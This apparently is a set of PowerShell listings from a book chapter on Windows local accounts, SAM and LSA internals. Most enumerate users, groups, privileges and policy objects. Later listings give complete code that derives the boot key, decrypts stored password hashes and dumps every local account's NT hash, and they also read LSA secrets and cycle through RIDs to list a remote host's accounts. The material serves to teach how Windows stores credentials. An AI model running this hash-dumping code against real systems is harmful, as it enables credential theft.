["```\nPS> **Get-LocalUser | Select-Object Name, Enabled, Sid**\nName               Enabled SID\n----               ------- ---\nadmin              True    S-1-5-21-2318445812-3516008893-216915059-1001\nAdministrator      False   S-1-5-21-2318445812-3516008893-216915059-500\nDefaultAccount     False   S-1-5-21-2318445812-3516008893-216915059-503\nGuest              False   S-1-5-21-2318445812-3516008893-216915059-501\nuser               True    S-1-5-21-2318445812-3516008893-216915059-1002\nWDAGUtilityAccount False   S-1-5-21-2318445812-3516008893-216915059-504 \n```", "```\nPS> **Get-NtSid -Name $env:COMPUTERNAME**\nName      Sid\n----      ---\nGRAPHITE\\ S-1-5-21-2318445812-3516008893-216915059 \n```", "```\n❶ PS> **$password = Read-Host -AsSecureString -Prompt \"Password\"**\nPassword: ************\n\nPS> **$name = \"Test\"**\n❷ PS> **New-LocalUser -Name $name -Password $password -Description \"Test User\"**\nName Enabled Description\n---- ------- -----------\nTest True    Test User\n\n❸ PS> **Get-NtSid -Name \"$env:COMPUTERNAME\\$name\"**\nName          Sid\n----          ---\nGRAPHITE\\Test S-1-5-21-2318445812-3516008893-216915059-1003 \n```", "```\nPS> **Remove-LocalUser -Name $name** \n```", "```\nPS> **Get-LocalGroup | Select-Object Name, Sid**\nName                    SID\n----                    ---\nAwesome Users           S-1-5-21-2318445812-3516008893-216915059-1002\nAdministrators          S-1-5-32-544\nBackup Operators        S-1-5-32-551\nCryptographic Operators S-1-5-32-569\n`--snip--` \n```", "```\nPS> **Get-LocalGroupMember -Name \"Awesome Users\"**\nObjectClass Name                     PrincipalSource\n----------- ----                     ---------------\nUser        GRAPHITE\\admin           Local\nGroup       NT AUTHORITY\\INTERACTIVE Unknown \n```", "```\nPS> **$name = \"TestGroup\"**\n❶ PS> **New-LocalGroup -Name $name -Description \"Test Group\"**\nName      Description\n----      -----------\nTestGroup Test Group\n\n❷ PS> **Get-NtSid -Name \"$env:COMPUTERNAME\\$name\"**\nName               Sid\n----               ---\nGRAPHITE\\TestGroup S-1-5-21-2318445812-3516008893-216915059-1005\n\n❸ PS> **Add-LocalGroupMember -Name $name -Member \"$env:USERDOMAIN\\$env:USERNAME\"**\nPS> **Get-LocalGroupMember -Name $name**\nObjectClass Name           PrincipalSource\n----------- ----           ---------------\n❹ User        GRAPHITE\\admin Local \n```", "```\nPS> **Remove-LocalGroup -Name $name** \n```", "```\nPS> **Get-NtAccountRight -Type Privilege**\nName                          Sids\n----                          ----\nSeCreateTokenPrivilege\nSeAssignPrimaryTokenPrivilege NT AUTHORITY\\NETWORK SERVICE, ...\nSeLockMemoryPrivilege\nSeIncreaseQuotaPrivilege      BUILTIN\\Administrators,  ...\nSeMachineAccountPrivilege\nSeTcbPrivilege\nSeSecurityPrivilege           BUILTIN\\Administrators\nSeTakeOwnershipPrivilege      BUILTIN\\Administrators\n`--snip--` \n```", "```\nPS> **Get-NtAccountRight -Type Logon**\nName                              Sids\n----                              ----\nSeInteractiveLogonRight           BUILTIN\\Backup Operators, BUILTIN\\Users, ...\nSeNetworkLogonRight               BUILTIN\\Backup Operators, BUILTIN\\Users, ...\nSeBatchLogonRight                 BUILTIN\\Administrators, ...\nSeServiceLogonRight               NT SERVICE\\ALL SERVICES, ...\nSeRemoteInteractiveLogonRight     BUILTIN\\Remote Desktop Users, ...\nSeDenyInteractiveLogonRight       GRAPHITE\\Guest\nSeDenyNetworkLogonRight           GRAPHITE\\Guest\nSeDenyBatchLogonRight\nSeDenyServiceLogonRight\nSeDenyRemoteInteractiveLogonRight \n```", "```\nPS> **$server = Connect-SamServer -ServerName 'localhost'**\nPS> **Format-NtSecurityDescriptor $server -Summary -MapGeneric**\n<Owner> : BUILTIN\\Administrators\n<Group> : BUILTIN\\Administrators\n<DACL>\nEveryone: (Allowed)(None)(Connect|EnumerateDomains|LookupDomain|ReadControl)\nBUILTIN\\Administrators: (Allowed)(None)(Full Access)\nNAMED CAPABILITIES\\User Signin Support: (Allowed)(None)(GenericExecute|GenericRead) \n```", "```\nPS> **Get-SamDomain -Server $server -InfoOnly**\nName     DomainId\n----     --------\nGRAPHITE S-1-5-21-2318445812-3516008893-216915059\nBuiltin  S-1-5-32\n\nPS> **$domain = Get-SamDomain -Server $server -Name \"$env:COMPUTERNAME\"**\nPS> **$domain.PasswordInformation**\nMinimumLength : 7\nHistoryLength : 24\nProperties    : Complex\nMaximumAge    : 42.00:00:00\nMinimumAge    : 1.00:00:00 \n```", "```\nPS> **Get-SamUser -Domain $domain -InfoOnly**\nName               Sid\n----               ---\nadmin              S-1-5-21-2318445812-3516008893-216915059-1001\nAdministrator      S-1-5-21-2318445812-3516008893-216915059-500\nDefaultAccount     S-1-5-21-2318445812-3516008893-216915059-503\nGuest              S-1-5-21-2318445812-3516008893-216915059-501\nuser               S-1-5-21-2318445812-3516008893-216915059-1002\nWDAGUtilityAccount S-1-5-21-2318445812-3516008893-216915059-504\n\n❶ PS> **$user = Get-SamUser -Domain $domain -Name \"WDAGUtilityAccount\"**\nPS> **$user.UserAccountControl**\n❷ AccountDisabled, NormalAccount\nPS> **Format-NtSecurityDescriptor $user -Summary**\n<Owner> : BUILTIN\\Administrators\n<Group> : BUILTIN\\Administrators\n<DACL>\n❸ Everyone: (Allowed)(None)(ReadGeneral|ReadPreferences|ReadLogon|ReadAccount|\nChangePassword|ListGroups|ReadGroupInformation|ReadControl)\n❹ BUILTIN\\Administrators: (Allowed)(None)(Full Access)\nGRAPHITE\\WDAGUtilityAccount: (Allowed)(None)(WritePreferences|ChangePassword|\nReadControl) \n```", "```\nPS> **Get-SamGroup -Domain $domain -InfoOnly**\nName Sid\n---- ---\nNone S-1-5-21-2318445812-3516008893-216915059-513\n❶ PS> **$group = Get-SamGroup $domain -Name \"None\"**\n❷ PS> **Get-SamGroupMember -Group $group**\nRelativeId                           Attributes\n----------                           ----------\n       500 Mandatory, EnabledByDefault, Enabled\n       501 Mandatory, EnabledByDefault, Enabled\n       503 Mandatory, EnabledByDefault, Enabled\n       504 Mandatory, EnabledByDefault, Enabled\n      1001 Mandatory, EnabledByDefault, Enabled\n      1002 Mandatory, EnabledByDefault, Enabled \n```", "```\nPS> **Get-SamAlias -Domain $domain -InfoOnly**\nName          Sid\n----          ---\n❶ Awesome Users S-1-5-21-1653919079-861867932-2690720175-101\n\n❷ PS> **$alias = Get-SamAlias -Domain $domain -Name \"Awesome Users\"**\n❸ PS> **Get-SamAliasMember -Alias $alias**\nName                     Sid\n----                     ---\nNT AUTHORITY\\INTERACTIVE S-1-5-4\nGRAPHITE\\admin           S-1-5-21-2318445812-3516008893-216915059-1001 \n```", "```\nPS> **$policy = Get-LsaPolicy**\nPS> **Format-NtSecurityDescriptor $policy -Summary**\n<Owner> : BUILTIN\\Administrators\n<Group> : NT AUTHORITY\\SYSTEM\n<DACL>\nNT AUTHORITY\\ANONYMOUS LOGON: (Denied)(None)(LookupNames)\nBUILTIN\\Administrators: (Allowed)(None)(Full Access)\nEveryone: (Allowed)(None)(ViewLocalInformation|LookupNames|ReadControl)\nNT AUTHORITY\\ANONYMOUS LOGON: (Allowed)(None)(ViewLocalInformation|LookupNames)\n`--snip--` \n```", "```\n❶ PS> **$policy = Get-LsaPolicy -Access ViewLocalInformation**\n❷ PS> **Get-LsaAccount -Policy $policy -InfoOnly**\nName                                Sid\n----                                ---\nWindow Manager\\Window Manager Group S-1-5-90-0\nNT VIRTUAL MACHINE\\Virtual Machines S-1-5-83-0\nNT SERVICE\\ALL SERVICES             S-1-5-80-0\nNT AUTHORITY\\SERVICE                S-1-5-6\nBUILTIN\\Performance Log Users       S-1-5-32-559\n`--snip--`\n\nPS> **$sid = Get-NtSid -KnownSid BuiltinUsers**\n❸ PS> **$account = Get-LsaAccount -Policy $policy -Sid $sid**\nPS> **Format-NtSecurityDescriptor -Object $account -Summary**\n<Owner> : BUILTIN\\Administrators\n<Group> : NT AUTHORITY\\SYSTEM\n<DACL>\n❹ BUILTIN\\Administrators: (Allowed)(None)(Full Access)\nEveryone: (Allowed)(None)(ReadControl) \n```", "```\nPS> **$account.Privileges**\nName                          Luid              Enabled\n----                          ----              -------\nSeChangeNotifyPrivilege       00000000-00000017 False\nSeIncreaseWorkingSetPrivilege 00000000-00000021 False\nSeShutdownPrivilege           00000000-00000013 False\nSeUndockPrivilege             00000000-00000019 False\nSeTimeZonePrivilege           00000000-00000022 False\n\nPS> **$account.SystemAccess**\nInteractiveLogon, NetworkLogon \n```", "```\nPS> **$policy = Get-LsaPolicy**\n❶ PS> **$secret = Get-LsaSecret -Policy $policy -Name \"DPAPI_SYSTEM\"**\n❷ PS> **Format-NtSecurityDescriptor $secret -Summary**\n<Owner> : BUILTIN\\Administrators\n<Group> : NT AUTHORITY\\SYSTEM\n<DACL>\nBUILTIN\\Administrators: (Allowed)(None)(Full Access)\nEveryone: (Allowed)(None)(ReadControl)\n\n❸ PS> **$value = $secret.Query()**\nPS> **$value**\nCurrentValue    CurrentValueSetTime  OldValue        OldValueSetTime\n------------    -------------------  --------        ---------------\n{1, 0, 0, 0...} 3/12/2021 1:46:08 PM {1, 0, 0, 0...} 11/18 11:42:47 PM\n\n❹ PS> **$value.CurrentValue | Out-HexDump -ShowAll**\n          00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F  - 0123456789ABCDEF\n-----------------------------------------------------------------------------\n00000000: 01 00 00 00 3B 14 CB FB B0 83 3D DF 98 A5 42 F9  - ....;.....=...B.\n00000010: 65 64 4B B5 95 63 E1 E8 9C C8 00 C0 80 0C 71 E0  - edK..c........q.\n00000020: C3 46 B1 43 A4 96 0E 65 5E B1 EC 46              - .F.C...e^..F \n```", "```\nPS> **$policy = Get-LsaPolicy -ServerName \"PRIMARYDC\"**\nPS> **Get-LsaTrustedDomain -Policy $policy -InfoOnly**\nName                      TrustDirection TrustType\n----                      -------------- ---------\nengineering.mineral.local BiDirectional  Uplevel\nsales.mineral.local       BiDirectional  Uplevel \n```", "```\nPS> **$policy = Get-LsaPolicy -Access LookupNames**\nPS> **Get-LsaName -Policy $policy -Sid \"S-1-1-0\", \"S-1-5-32-544\"**\nDomain  Name           Source  NameUse\n------  ----           ------  -------\n        Everyone       Account WellKnownGroup\nBUILTIN Administrators Account Alias\n\nPS> **Get-LsaSid -Policy $policy -Name \"Guest\" | Select-Object Sddl**\nSddl\n----\nS-1-5-21-1653919079-861867932-2690720175-501 \n```", "```\n❶ PS> **$domain_sid = Get-NtSid -SecurityAuthority Nt -RelativeIdentifier 99**\n❷ PS> **$user_sid = Get-NtSid -BaseSid $domain_sid -RelativeIdentifier 1000**\nPS> **$domain = \"CUSTOMDOMAIN\"**\nPS> **$user = \"USER\"**\nPS> **Invoke-NtToken -System {**\n❸ **Add-NtSidName -Domain $domain -Sid $domain_sid -Register**\n    **Add-NtSidName -Domain $domain -Name $user -Sid $user_sid -Register**\n❹ **Use-NtObject($policy = Get-LsaPolicy) {**\n **Get-LsaName -Policy $policy -Sid $domain_sid, $user_sid**\n **}**\n❺ **Remove-NtSidname -Sid $user_sid -Unregister**\n **Remove-NtSidName -Sid $domain_sid -Unregister**\n**}**\nDomain       Name      Source  NameUse\n------       ----      ------  -------\nCUSTOMDOMAIN           Account Domain\nCUSTOMDOMAIN USER      Account WellKnownGroup \n```", "```\nPS> **Enable-NtTokenPrivilege SeBackupPrivilege**\nPS> **New-PSDrive -PSProvider NtObjectManager -Name SEC -Root ntkey:MACHINE**\nPS> **ls -Depth 1 -Recurse SEC:\\SAM\\SAM**\nName                    TypeName\n----                    --------\nSAM\\SAM\\Domains         Key\nSAM\\SAM\\LastSkuUpgrade  Key\nSAM\\SAM\\RXACT           Key\n❶ SAM\\SAM\\Domains\\Account Key\n❷ SAM\\SAM\\Domains\\Builtin Key \n```", "```\nPS> **$key = Get-Item SEC:\\SAM\\SAM\\Domains\\Account\\Users\\000001F4** ❶\nPS> **$key.Values** ❷\nName                    Type   DataObject\n----                    ----   ----------\nF                       Binary {3, 0, 1, 0...}\nV                       Binary {0, 0, 0, 0...}\nSupplementalCredentials Binary {0, 0, 0, 0...}\n\nPS> **function Get-VariableAttribute($key, [int]$Index) {**\n **$MaxAttr = 0x11**\n **$V = $key[\"V\"].Data**\n **$base_ofs = $Index * 12**\n **$curr_ofs = [System.BitConverter]::ToInt32($V, $base_ofs) + ($MaxAttr * 12)**\n **$len = [System.BitConverter]::ToInt32($V, $base_ofs + 4)**\n\n **if ($len -gt 0) {**\n **$V[$curr_ofs..($curr_ofs+$len-1)]**\n **} else {**\n **@()**\n **}**\n**}**\n\nPS> **$sd = Get-VariableAttribute $key -Index 0** ❸\nPS> **New-NtSecurityDescriptor -Byte $sd**\nOwnerDACL ACE Count SACL ACE Count Integrity Level\n------------------- -------------- ---------------\nBUILTIN\\Administrators 42NONE\n\nPS> **Get-VariableAttribute $key -Index 1 | Out-HexDump -ShowAll** ❹\n                   00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F  - 0123456789ABCDEF\n-----------------------------------------------------------------------------\n00000000: 41 00 64 00 6D 00 69 00 6E 00 69 00 73 00 74 00  - A.d.m.i.n.i.s.t.\n00000010: 72 00 61 00 74 00 6F 00 72 00                    - r.a.t.o.r.\n\nPS> **$lm = Get-VariableAttribute $key -Index 13** ❺\nPS> **$lm | Out-HexDump -ShowAddress**\n00000000: 03 00 02 00 00 00 00 00 4B 70 1B 49 1A A4 F9 36\n00000010: 81 F7 4D 52 8A 1B A5 D0\n\nPS> **$nt = Get-VariableAttribute $key -Index 14** ❻\nPS> **$nt | Out-HexDump -ShowAddress**\n00000000: 03 00 02 00 10 00 00 00 CA 15 AB DA 31 00 2A 72\n00000010: 6E 4B CE 89 27 7E A6 F6 D8 19 CE B7 58 AC 93 F5\n00000020: D1 89 73 FB B2 C3 AA 41 95 FE 6F F8 B7 58 37 09\n00000030: 0D 4B E2 4C DB 37 3F 91 \n```", "```\nPS> **function Get-LsaSystemKey {**\n❶ **$names = \"JD\", \"Skew1\", \"GBG\", \"Data\"**\n **$keybase = \"NtKey:\\MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\"**\n **$key = $names | ForEach-Object {**\n **$key = Get-Item \"$keybase\\$_\"**\n❷ **$key.ClassName | ConvertFrom-HexDump**\n **}**\n❸ **8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 |**\n**ForEach-Object {**\n **$key[$_]**\n **}**\n**}**\n❹ PS> **Get-LsaSystemKey | Out-HexDump**\n3E 98 06 D8 E3 C7 12 88 99 CF F4 1D 5E DE 7E 21 \n```", "```\nPS> **function Unprotect-PasswordEncryptionKey {**\n❶ **$key = Get-Item SEC:\\SAM\\SAM\\Domains\\Account**\n **$fval = $key[\"F\"].Data**\n\n❷ **$enctype = [BitConverter]::ToInt32($fval, 0x68)**\n **$endofs = [BitConverter]::ToInt32($fval, 0x6C) + 0x68**\n **$data = $fval[0x70..($endofs-1)]**\n❸ **switch($enctype) {**\n **1 {Unprotect-PasswordEncryptionKeyRC4 -Data $data}**\n **2 {Unprotect-PasswordEncryptionKeyAES -Data $data}**\n **default {throw \"Unknown password encryption format\"}**\n **}**\n**}** \n```", "```\n❶ PS> **function Get-MD5Hash([byte[]]$Data) {**\n **$md5 = [System.Security.Cryptography.MD5]::Create()**\n **$md5.ComputeHash($Data)**\n**}**\n\nPS> **function Get-StringBytes([string]$String) {**\n **[System.Text.Encoding]::ASCII.GetBytes($String + \"`0\")**\n**}**\n\nPS> **function Compare-Bytes([byte[]]$Left, [byte[]]$Right) {**\n **[Convert]::ToBase64String($Left) -eq [Convert]::ToBase64String($Right)**\n**}**\n\n❷ PS> **function Unprotect-PasswordEncryptionKeyRC4([byte[]]$Data) {**\n❸ **$syskey = Get-LsaSystemKey**\n **$qiv = Get-StringBytes '!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%'**\n **$niv = Get-StringBytes '0123456789012345678901234567890123456789'**\n **$rc4_key = Get-MD5Hash -Data ($Data[0..15] + $qiv + $syskey + $niv)**\n\n❹ **$decbuf = Unprotect-RC4 -Data $data -Offset 0x10 -Length 32 -Key $rc4_key**\n **$pek = $decbuf[0..15]**\n **$hash = $decbuf[16..31]**\n\n❺ **$pek_hash = Get-MD5Hash -Data ($pek + $niv + $pek + $qiv)**\n **if (!(Compare-Bytes $hash $pek_hash)) {**\n **throw \"Invalid password key for RC4.\"**\n **}**\n\n **$pek**\n**}** \n```", "```\n❶PS> **function Unprotect-AES([byte[]]$Data, [byte[]]$IV, [byte[]]$Key) {**\n **$aes = [System.Security.Cryptography.Aes]::Create()**\n **$aes.Mode = \"CBC\"**\n **$aes.Padding = \"PKCS7\"**\n **$aes.Key = $Key**\n **$aes.IV = $IV**\n **$aes.CreateDecryptor().TransformFinalBlock($Data, 0, $Data.Length)**\n**}**\n\nPS> **function Unprotect-PasswordEncryptionKeyAES([byte[]]$Data) {**\n❷ **$syskey = Get-LsaSystemKey**\n **$hash_len = [System.BitConverter]::ToInt32($Data, 0)**\n **$enc_len = [System.BitConverter]::ToInt32($Data, 4)**\n❸ **$iv = $Data[0x8..0x17]**\n **$pek = Unprotect-AES -Key $syskey -IV $iv -Data $Data[0x18..(0x18+$enc_len-1)]**\n\n❹ **$hash_ofs = 0x18+$enc_len**\n **$hash_data = $Data[$hash_ofs..($hash_ofs+$hash_len-1)]**\n **$hash = Unprotect-AES -Key $syskey -IV $iv -Data $hash_data**\n\n❺ **$sha256 = [System.Security.Cryptography.SHA256]::Create()**\n **$pek_hash = $sha256.ComputeHash($pek)**\n **if (!(Compare-Bytes $hash $pek_hash)) {**\n **throw \"Invalid password key for AES.\"**\n **}**\n\n **$pek**\n**}** \n```", "```\nPS> **Unprotect-PasswordEncryptionKey | Out-HexDump**\nE1 59 B0 6A 50 D9 CA BE C7 EA 6D C5 76 C3 7A C5 \n```", "```\nPS> **function Unprotect-PasswordHash([byte[]]$Key, [byte[]]$Data,**\n**[int]$Rid, [int]$Type) {**\n **$enc_type = [BitConverter]::ToInt16($Data, 2)**\n **switch($enc_type) {**\n **1 {Unprotect-PasswordHashRC4 -Key $Key -Data $Data -Rid $Rid -Type $Type}**\n **2 {Unprotect-PasswordHashAES -Key $Key -Data $Data}**\n **default {throw \"Unknown hash encryption format\"}**\n **}**\n**}** \n```", "```\nPS> **function Unprotect-PasswordHashRC4([byte[]]$Key, [byte[]]$Data,**\n**[int]$Rid, [int]$Type) {**\n❶ **if ($Data.Length -lt 0x14) {**\n **return @()**\n **}**\n❷ **$iv = switch($Type) {**\n **1 {\"LMPASSWORD\"}**\n **2 {\"NTPASSWORD\"}**\n**3 {\"LMPASSWORDHISTORY\"}**\n **4 {\"NTPASSWORDHISTORY\"}**\n **5 {\"MISCCREDDATA\"}**\n **}**\n❸ **$key_data = $Key + [BitConverter]::GetBytes($Rid) + (Get-StringBytes $iv)**\n **$rc4_key = Get-MD5Hash -Data $key_data**\n❹ **Unprotect-RC4 -Key $rc4_key -Data $Data -Offset 4 -Length 16**\n**}** \n```", "```\nPS> **function Unprotect-PasswordHashAES([byte[]]$Key, [byte[]]$Data) {**\n❶ **$length = [BitConverter]::ToInt32($Data, 4)**\n **if ($length -eq 0) {**\n **return @()**\n **}**\n❷ **$IV = $Data[8..0x17]**\n **$value = $Data[0x18..($Data.Length-1)]**\n❸ **Unprotect-AES -Key $Key -IV $IV -Data $value**\n**}** \n```", "```\nPS> **$pek = Unprotect-PasswordEncryptionKey**\nPS> **$lm_dec = Unprotect-PasswordHash -Key $pek -Data $lm -Rid 500 -Type 1**\nPS> **$lm_dec | Out-HexDump**\n❶\nPS> **$nt_dec = Unprotect-PasswordHash -Key $pek -Data $nt -Rid 500 -Type 2**\nPS> **$nt_dec | Out-HexDump**\n❷ 40 75 5C F0 7C B3 A7 17 46 34 D6 21 63 CE 7A DB \n```", "```\nPS> **function Get-UserDESKey([uint32]$Rid) {**\n **$ba = [System.BitConverter]::GetBytes($Rid)**\n **$key1 = ConvertTo-DESKey $ba[2], $ba[1], $ba[0], $ba[3], $ba[2], $ba[1],** \n**$ba[0]**\n **$key2 = ConvertTo-DESKey $ba[1], $ba[0], $ba[3], $ba[2], $ba[1], $ba[0],** \n**$ba[3]**\n **$key1, $key2**\n**}**\n\nPS> **function ConvertTo-DESKey([byte[]]$Key) {**\n **$k = [System.BitConverter]::ToUInt64($Key + 0, 0)**\n **for($i = 7; $i -ge 0; $i--) {**\n **$curr = ($k -shr ($i * 7)) -band 0x7F**\n **$b = $curr**\n **$b = $b -bxor ($b -shr 4)**\n **$b = $b -bxor ($b -shr 2)**\n **$b = $b -bxor ($b -shr 1)**\n **($curr -shl 1) -bxor ($b -band 0x1) -bxor 1**\n **}**\n**}** \n```", "```\nPS> **function Unprotect-DES([byte[]]$Key, [byte[]]$Data, [int]$Offset) {**\n **$des = [Security.Cryptography.DES]::Create()**\n **$des.Key = $Key**\n **$des.Mode = \"ECB\"**\n **$des.Padding = \"None\"**\n **$des.CreateDecryptor().TransformFinalBlock($Data, $Offset, 8)**\n**}**\n\nPS> **function Unprotect-PasswordHashDES([byte[]]$Hash, [uint32]$Rid) {**\n **$keys = Get-UserDESKey -Rid $Rid**\n **(Unprotect-DES -Key $keys[0] -Data $Hash -Offset 0) +**\n **(Unprotect-DES -Key $keys[1] -Data $Hash -Offset 8)**\n**}** \n```", "```\nPS> **Unprotect-PasswordHashDES -Hash $nt_dec -Rid 500 | Out-HexDump**\n51 1A 3B 26 2C B6 D9 32 0E 9E B8 43 15 8D 85 22\n\nPS> **Get-MD4Hash -String \"adminpwd\" | Out-HexDump**\n51 1A 3B 26 2C B6 D9 32 0E 9E B8 43 15 8D 85 22 \n```", "```\nPS> **ls -Depth 1 -Recurse SEC:\\SECURITY**\n❶ SECURITY\\Cache                            Key\nSECURITY\\Policy                           Key\nSECURITY\\RXACT                            Key\n❷ SECURITY\\SAM                              Key\n❸ SECURITY\\Policy\\Accounts                  Key\nSECURITY\\Policy\\CompletedPrivilegeUpdates Key\nSECURITY\\Policy\\DefQuota                  Key\nSECURITY\\Policy\\Domains                   Key\nSECURITY\\Policy\\LastPassCompleted         Key\nSECURITY\\Policy\\PolAcDmN                  Key\nSECURITY\\Policy\\PolAcDmS                  Key\n❹ SECURITY\\Policy\\PolAdtEv                  Key\n❺ SECURITY\\Policy\\PolAdtLg                  Key\nSECURITY\\Policy\\PolDnDDN                  Key\nSECURITY\\Policy\\PolDnDmG                  Key\nSECURITY\\Policy\\PolDnTrN                  Key\nSECURITY\\Policy\\PolEKList                 Key\nSECURITY\\Policy\\PolMachineAccountR        Key\nSECURITY\\Policy\\PolMachineAccountS        Key\nSECURITY\\Policy\\PolOldSyskey              Key\nSECURITY\\Policy\\PolPrDmN                  Key\nSECURITY\\Policy\\PolPrDmS                  Key\nSECURITY\\Policy\\PolRevision               Key\n❻ SECURITY\\Policy\\SecDesc                   Key\n❼ SECURITY\\Policy\\Secrets                   Key \n```", "```\n❶ PS> **ls SEC:\\SECURITY\\Policy\\Secrets**\nName         TypeName\n----         --------\n$MACHINE.ACC Key\nDPAPI_SYSTEM Key\nNL$KM        Key\n\n❷ PS> **ls SEC:\\SECURITY\\Policy\\Secrets\\DPAPI_SYSTEM**\nName     TypeName\n----     --------\nCupdTime Key\nCurrVal  Key\nOldVal   Key\nOupdTime Key\nSecDesc  Key\n\nPS> **$key = Get-Item SEC:\\SECURITY\\Policy\\Secrets\\DPAPI_SYSTEM\\CurrVal**\n❸ PS> **$key.DefaultValue.Data | Out-HexDump -ShowAll**\n          00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F  - 0123456789ABCDEF\n-----------------------------------------------------------------------------\n00000000: 00 00 00 01 5F 5D 25 70 36 13 17 41 92 57 5F 50  - ...._]%p6..A.W_P\n00000010: 89 EA AA 35 03 00 00 00 00 00 00 00 DF D6 A4 60  - ...5...........`\n00000020: 5B FB EE B2 04 04 1E A9 E9 5B FA 77 85 5E 57 07  - [........[.w.^W.\n00000030: CC 2A 53 BF 2A 84 E0 88 86 B9 7A 55 E7 63 79 6C  - .*S.*.....zU.cyl\n00000040: 8A 72 85 67 31 BD 52 3E 11 E0 49 A6 AE 9B BE B5  - .r.g1.R>..I.....\n00000050: 21 15 F0 1D 75 C3 F8 CA 46 CC 4A 58 B3 9C 4F 1E  - !...u...F.JX..O.\n00000060: D9 8B 61 6C A4 A0 77 18 F1 42 61 43 C6 12 CE 22  - ..al..w..BaC...\"\n00000070: 03 EC 80 1B 51 07 F7 16 50 CD 04 71              - ....Q...P..q \n```", "```\nPS> **function Get-SidNames {**\n **param(**\n❶ **[string]$Server,**\n **[string]$Domain,**\n **[int]$MinRid = 500,**\n **[int]$MaxRid = 1499**\n **)**\n **if (\"\" -eq $Domain) {**\n **$Domain = $Server**\n **}**\n❷ **Use-NtObject($policy = Get-LsaPolicy -SystemName $Server -Access** \n**LookupNames) {**\n ❸ **$domain_sid = Get-LsaSid $policy \"$Domain\\\"** \n ❹ **$sids = $MinRid..$MaxRid | ForEach-Object {**\n **Get-NtSid -BaseSid $domain_sid -RelativeIdentifier $_**\n **}**\n❺ **Get-LsaName -Policy $policy -Sid $sids | Where-Object NameUse** \n**-ne \"Unknown\"** \n **}**\n**}**\n\n❻PS> **Get-SidNames -Server \"CINNABAR\" | Select-Object QualifiedName, Sddl**\nQualifiedName              Sddl\n-------------              ----\nCINNABAR\\Administrator    S-1-5-21-2182728098-2243322206-2265510368-500\nCINNABAR\\Guest          S-1-5-21-2182728098-2243322206-2265510368-501\nCINNABAR\\DefaultAccount    S-1-5-21-2182728098-2243322206-2265510368-503\nCINNABAR\\WDAGUtilityAccount S-1-5-21-2182728098-2243322206-2265510368-504\nCINNABAR\\None           S-1-5-21-2182728098-2243322206-2265510368-513\nCINNABAR\\LocalAdmin         S-1-5-21-2182728098-2243322206-2265510368-1000 \n```", "```\nPS> **function Get-UserObject([string]$Server, [string]$User) {**\n **Use-NtObject($sam = Connect-SamServer -ServerName $Server) {**\n **Use-NtObject($domain = Get-SamDomain -Server $sam -User) {**\n **Get-SamUser -Domain $domain -Name $User -Access ForcePasswordChange**\n **}**\n **}**\n**}**\n\nPS> **function Set-UserPassword([string]$Server, [string]$User, [bool]$Expired) {**\n **Use-NtObject($user_obj = Get-UserObject $Server $User) {**\n **$pwd = Read-Host -AsSecureString -Prompt \"New Password\"**\n **$user_obj.SetPassword($pwd, $Expired)**\n **}**\n**}** \n```", "```\nPS> **Set-UserPassword -Server $env:COMPUTERNAME \"user\"**\nNew Password: ************* \n```", "```\n❶ PS> **function Get-PasswordHash {**\n **param(**\n **[byte[]]$Pek,**\n **$Key,**\n **$Rid,**\n **[switch]$LmHash**\n **)**\n **$index = 14**\n **$type = 2**\n **if ($LmHash) {**\n **$index = 13**\n **$type = 1**\n **}**\n **$hash_enc = Get-VariableAttribute $key -Index $Index**\n **if ($null -eq $hash_enc) {**\n **return @()**\n **}**\n **$hash_dec = Unprotect-PasswordHash -Key $Pek -Data $hash_enc -Rid $Rid**\n**-Type $type**\n **if ($hash_dec.Length -gt 0) {**\n **Unprotect-PasswordHashDES -Hash $hash_dec -Rid $Rid**\n **}**\n**}**\n\n❷ PS> **function Get-UserHashes {**\n **param(**\n **[Parameter(Mandatory)]**\n **[byte[]]$Pek,**\n **[Parameter(Mandatory, ValueFromPipeline)]**\n **$Key**\n **)**\n\n **PROCESS {**\n **try {**\n **if ($null -eq $Key[\"V\"]) {**\n **return**\n **}**\n **$rid = [int]::Parse($Key.Name, \"HexNumber\")**\n**$name = Get-VariableAttribute $key -Index 1**\n\n **[PSCustomObject]@{**\n **Name=[System.Text.Encoding]::Unicode.GetString($name)**\n **LmHash = Get-PasswordHash $Pek $key $rid -LmHash**\n **NtHash = Get-PasswordHash $Pek $key $rid**\n **Rid = $rid**\n **}**\n **} catch {**\n **Write-Error $_**\n **}**\n **}**\n**}**\n\n❸ PS> **$pek = Unprotect-PasswordEncryptionKey**\n❹ PS> **ls \"SEC:\\SAM\\SAM\\Domains\\Account\\Users\" | Get-UserHashes $pek**\nNameLmHash NtHash                  Rid\n---------- ------                  ---\nAdministrator                                     500\nGuest                                             501\nDefaultAccount                                    503\nWDAGUtilityAccount        {125, 218, 222, 22...}  504\nadmin                     {81, 26, 59, 38...}     1001 \n```"]